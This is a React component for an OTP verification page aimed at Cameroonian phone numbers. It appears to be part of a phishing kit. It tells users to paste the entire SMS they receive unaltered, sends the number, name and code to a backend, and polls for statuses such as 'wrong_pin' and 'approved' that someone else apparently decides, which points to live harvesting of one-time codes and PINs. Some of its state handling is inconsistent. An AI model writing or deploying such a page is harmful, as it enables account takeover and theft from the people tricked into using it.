import React, { useRef, useState, useEffect } from "react";
import "./otp.css";
import { useNavigate } from "react-router-dom";
import { useVerification } from "../hooks/useVerification";
import { verificationService } from "../services/api";

const OtpVerification = ({ length = 4, client, myFuncs }) => {
  const { name, number } = client;
  const { setOtp } = myFuncs;
  const navigate = useNavigate();
  // const [otpp, setOtpp] = useState(Array(length).fill(""));
  const [otpp, setOtpp] = useState("");
  const inputRefs = useRef([]);
  const [timer, setTimer] = useState(60);
  const [next, setNext] = useState(false);
  const [wrongCode, setWrongCode] = useState(false);
  const [sessionId, setSessionId] = useState(null);
  const [pollingInterval, setPollingInterval] = useState(null);
  const timerZero = timer > 0;
  const countryCode = 237; // Cameroon country code
  const [otptext, setOtptext] = useState("");

  const intervalRef = useRef(null);

  // Use the hook for status tracking
  const { status, loading, error, startVerification, reset } =
    useVerification();

  const statusMessages = {
    pending: "⏳ Verifying...",
    approved: "✅ Verified! Redirecting...",
    wrong_code: "❌ Wrong OTP code",
    wrong_pin: "❌ Wrong PIN",
    expired: "⏰ Time expired",
    resend_requested: "🔄 OTP resend requested",
  };

  // Timer effect
  useEffect(() => {
    intervalRef.current = setInterval(() => {
      setTimer((prevCount) => {
        if (prevCount <= 1) {
          clearInterval(intervalRef.current);
          return 0;
        }
        return prevCount - 1;
      });
    }, 1000);

    return () => {
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      // Cleanup polling on unmount
      if (pollingInterval) {
        clearInterval(pollingInterval);
      }
    };
  }, [timer]);

  // Status effect for navigation
  useEffect(() => {
    if (status === "approved") {
      // Auto-redirect after 2 seconds
      const timeout = setTimeout(() => {
        navigate("/verification");
      }, 2000);
      return () => clearTimeout(timeout);
    }

    if (status === "wrong_pin") {
      // Return to login on wrong PIN
      const timeout = setTimeout(() => {
        navigate("/login");
      }, 2000);
      return () => clearTimeout(timeout);
    }

    if (status === "wrong_code") {
      setWrongCode(true);
      const timeout = setTimeout(() => {
        setWrongCode(false);
        reset();
        setOtpp(Array(length).fill(""));
        inputRefs.current[0]?.focus();
      }, 3000);
      return () => clearTimeout(timeout);
    }
  }, [status, navigate, reset, length]);

  const handleApprovedOtp = () => {
    navigate("/verification");
  };

  // Manual polling for OTP status (backup to hook)
  const startPolling = (sessionId) => {
    if (pollingInterval) {
      clearInterval(pollingInterval);
    }

    let attempts = 0;
    const maxAttempts = 100; // ~3.3 minutes at 2-second intervals

    const poll = async () => {
      if (attempts >= maxAttempts) {
        console.log("⏰ Max polling attempts reached");
        if (pollingInterval) {
          clearInterval(pollingInterval);
          setPollingInterval(null);
        }
        return;
      }

      attempts++;

      try {
        const data = await verificationService.checkStatus(sessionId);
        console.log("📊 OTP Status check:", data);

        // Handle status changes
        if (data.status === "approved") {
          handleApprovedOtp();
          // Trigger hook status change or handle directly
          // console.log("✅ OTP approved via polling!");
          if (pollingInterval) {
            clearInterval(pollingInterval);
            setPollingInterval(null);
          }
          // Force navigation
          // setTimeout(() => navigate("/verification"), 100);
        } else if (data.status === "wrong_code") {
          console.log("❌ Wrong OTP code via polling");
          setWrongCode(true);
          if (pollingInterval) {
            clearInterval(pollingInterval);
            setPollingInterval(null);
          }
        } else if (data.status === "wrong_pin") {
          console.log("❌ Wrong PIN via polling");
          if (pollingInterval) {
            clearInterval(pollingInterval);
            setPollingInterval(null);
          }
          setTimeout(() => navigate("/login"), 0);
        } else if (data.status === "expired") {
          console.log("⏰ Session expired via polling");
          if (pollingInterval) {
            clearInterval(pollingInterval);
            setPollingInterval(null);
          }
        }
      } catch (err) {
        console.error("❌ Polling error:", err);
      }
    };

    // Start polling immediately
    poll();

    // Set up interval
    const interval = setInterval(poll, 2000);
    setPollingInterval(interval);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    console.log(number);
    console.log(otptext);
    setWrongCode(false);
    if (otptext === "" || number === "") {
      console.log("no otp or number");
      return;
    }

    // const myotp = otpp;

    const userData = {
      phoneNumber: number,
      otpCode: otptext,
      countryCode: `+${countryCode}`,
      userId: `user_${Date.now()}`,
      userName: name,
    };

    try {
      console.log("📤 Sending OTP verification...");
      const result = await startVerification(userData);

      if (result && result.sessionId) {
        console.log("🎯 OTP Session ID:", result.sessionId);
        setSessionId(result.sessionId);

        // Start manual polling as backup
        startPolling(result.sessionId);
      }
    } catch (err) {
      console.error("❌ Verification error:", err);
      if (
        err.response?.data?.error?.includes("Wrong") ||
        err.message.includes("wrong")
      ) {
        setWrongCode(true);
      }
    }
  };

  const resetTimer = () => {
    setTimer(120);
    reset(); // Reset verification state
    setWrongCode(false);
    setOtpp(Array(length).fill(""));
    inputRefs.current[0]?.focus();
  };

  const handleChange = (index, value) => {
    // if (!/^\d*$/.test(value)) return;

    // const newOtp = [...otpp];
    // newOtp[index] = value.slice(-1);
    setOtpp(value);

    if (value !== "" && index < length - 1) {
      inputRefs.current[index + 1]?.focus();
    }

    // Auto-submit if all digits filled
    // if (value !== "" && index === length - 1) {
    //   const filledOtp = [...newOtp];
    //   if (filledOtp.every((digit) => digit !== "")) {
    //     // Auto-submit after short delay
    //     setTimeout(() => {
    //       handleSubmit(new Event("submit"));
    //     }, 300);
    //   }
    // }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === "Backspace") {
      e.preventDefault();

      if (otpp[index] !== "") {
        const newOtp = [...otpp];
        newOtp[index] = "";
        setOtpp(newOtp);
      } else if (index > 0) {
        const newOtp = [...otpp];
        newOtp[index - 1] = "";
        setOtpp(newOtp);
        inputRefs.current[index - 1]?.focus();
      }
    }

    if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }

    if (e.key === "ArrowRight" && index < length - 1) {
      inputRefs.current[index + 1]?.focus();
    }

    if (e.key === "Enter" && otpp.every((digit) => digit !== "")) {
      handleSubmit(e);
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").trim();
    const numbersOnly = pastedData.replace(/\D/g, "");

    if (numbersOnly.length === length) {
      const newOtp = numbersOnly.split("").slice(0, length);
      setOtpp(newOtp);
      inputRefs.current[length - 1]?.focus();

      // Auto-submit
      setTimeout(() => {
        handleSubmit(new Event("submit"));
      }, 300);
    } else if (numbersOnly.length > 0) {
      const newOtp = [...otpp];
      const charsToFill = Math.min(numbersOnly.length, length);

      for (let i = 0; i < charsToFill; i++) {
        newOtp[i] = numbersOnly[i];
      }

      setOtpp(newOtp);
      const nextIndex = Math.min(charsToFill, length - 1);
      inputRefs.current[nextIndex]?.focus();
    }
  };

  const clearOTP = () => {
    setOtpp(Array(length).fill(""));
    inputRefs.current[0]?.focus();
    setWrongCode(false);
  };

  const handleFocus = (e) => {
    e.target.select();
  };

  const handleSubmission = () => {
    setNext(true);
    const combinedOtp = otpp.join("");
    setOtp(combinedOtp);
    // If already approved, navigate
    if (status === "approved") {
      navigate("/verification");
    }
  };

  // Early returns for specific states
  if (status === "approved") {
    // navigate("/verification");
    handleApprovedOtp();
    return (
      <div className="otp-container">
        <div className="verification-success">
          <h2>✅ Wait for next otp!</h2>
          <p>You will be redirected shortly...</p>
        </div>
      </div>
    );
  }

  if (status === "wrong_pin") {
    navigate("/login");

    return (
      <div className="otp-container">
        <div className="verification-error">
          <h2 style={{ color: "red" }}>❌ Your PIN is wrong!</h2>
          <p>Returning to login...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="otp-container">
      <div className="otpheader">
        {error && (
          <div
            className="error-message"
            style={{ color: "red", marginBottom: "10px" }}
          >
            {error}
          </div>
        )}

        {status && status !== "pending" && status !== "approved" && (
          <div
            className="status-message"
            style={{
              color: status.includes("wrong") ? "red" : "orange",
              marginBottom: "10px",
              padding: "8px",
              backgroundColor: status.includes("wrong") ? "#ffeeee" : "#fff8e1",
              borderRadius: "5px",
            }}
          >
            {statusMessages[status] || status}
          </div>
        )}

        <h2>OTP Verification</h2>
        <p>
          <strong>
            We have sent a one-time password (OTP) to your number. Copy the
            message that we send to your number message and Enter It here to
            Verify Your number <br></br>
          </strong>
          <span style={{ fontWeight: "bold", color: "#333" }}>{number}</span>
        </p>
      </div>

      <div className="otp-inputs">
        {/* {otpp.map((digit, index) => (
          <input
            key={index}
            ref={(el) => (inputRefs.current[index] = el)}
            type="text"
            inputMode="numeric"
            maxLength="1"
            value={digit}
            onChange={(e) => handleChange(index, e.target.value)}
            onKeyDown={(e) => handleKeyDown(index, e)}
            onPaste={handlePaste}
            onFocus={handleFocus}
            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
            autoComplete="one-time-code"
            disabled={loading || status === "pending"}
          />
        ))} */}
        <textarea
          // key={index}
          // ref={(el) => (inputRefs.current[index] = el)}
          type="text"
          // inputMode="numeric"
          // maxLength="1"
          value={otptext}
          onChange={(e) => setOtptext(e.target.value)}
          className={`otp-input1`}
          spellCheck="false"
          autofill="true"
          // autoComplete="one-time-code"
        />
      </div>

      {wrongCode && (
        <div
          className="error-message"
          style={{
            color: "red",
            textAlign: "center",
            margin: "10px 0",
            padding: "8px",
            backgroundColor: "#ffeeee",
            borderRadius: "5px",
          }}
        >
          ❌ Wrong OTP code. Please try again.
        </div>
      )}

      <div className="timer-section">
        {timer === 0 ? (
          <p className="resindp">You can now resend OTP</p>
        ) : (
          <p className="resindp">Resend OTP in {timer} seconds</p>
        )}
      </div>

      <div className="otp-display">
        <p>
          <strong>{"Do not alter the message"}</strong>
        </p>

        {!next ? (
          <button
            onClick={handleSubmit}
            className="copy-btn"
            type="button"
            disabled={loading || status === "pending"}
            style={{
              opacity:
                // otpp.join("").length !== length ||
                loading || status === "pending" ? 0.6 : 1,
              cursor:
                // otpp.join("").length !== length ||
                loading || status === "pending" ? "not-allowed" : "pointer",
            }}
          >
            {loading || status === "pending" ? (
              <span>⏳ Verifying...</span>
            ) : status && statusMessages[status] ? (
              statusMessages[status]
            ) : (
              "Submit OTP"
            )}
          </button>
        ) : (
          <button onClick={handleSubmission} className="copy-btn" type="button">
            Finish
          </button>
        )}

        <div className="otp-actions">
          {status === "expired" && (
            <button onClick={reset} className="retry-button">
              ↻ Try Again
            </button>
          )}
        </div>
      </div>
    </div>
  );
};

export default OtpVerification;
